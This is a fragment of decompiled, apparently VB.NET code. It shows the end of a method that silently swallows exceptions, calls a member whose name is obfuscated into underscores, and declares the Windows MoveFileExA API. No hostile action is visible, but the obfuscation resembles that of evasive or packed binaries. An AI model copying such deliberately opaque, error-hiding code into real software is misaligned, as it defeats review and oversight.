				catch (System.Exception arg_AA_0)
				{
					ProjectData.SetProjectError(arg_AA_0);
					_________________________________________________.___________(string_0);
					ProjectData.ClearProjectError();
				}
			}
		}
		catch (System.Exception arg_BE_0)
		{
			ProjectData.SetProjectError(arg_BE_0);
			ProjectData.ClearProjectError();
		}
	}

	[System.Runtime.InteropServices.DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern long MoveFileExA([System.Runtime.InteropServices.MarshalAs(System.Runtime.InteropServices.UnmanagedType.VBByRefStr)] ref string string_0, [System.Runtime.InteropServices.MarshalAs(System.Runtime.InteropServices.UnmanagedType.VBByRefStr)] ref string string_1, long long_0);
}
